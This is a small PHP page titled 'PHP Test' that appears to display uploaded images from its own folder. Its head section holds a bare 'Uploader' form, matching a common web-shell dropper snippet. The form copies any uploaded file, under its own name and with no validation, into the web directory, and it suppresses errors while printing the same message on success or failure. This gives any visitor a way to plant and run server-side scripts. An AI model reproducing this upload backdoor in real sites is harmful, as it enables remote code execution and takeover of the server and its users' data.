<html>

<head>
    <?php
    echo "Uploader<br>";
    echo "<br>";
    echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
    echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
    if (isset($_POST["_upl"])) {
        if ($_POST["_upl"] == "Upload") {
            if (@copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])) {
                echo "<b>Upload !!!</b><br><br>";
            } else {
                echo "<b>Upload !!!</b><br><br>";
            }
        }
    }
    
    ?>
    <style>
        .img-upload {
            height: 400px;
        }
    </style>
    <title>PHP Test</title>
</head>

<body>
    <?php
    $handle = opendir(dirname(realpath(__FILE__)) . '');
    while ($file = readdir($handle)) {
        if ($file !== 'index.php') {
            if ($file !== '.' && $file !== '..') {
                echo '<img class="img-upload" src="./php-test/' . $file . '" border="0" />';
            }
        }
    }
    ?>
</body>

</html>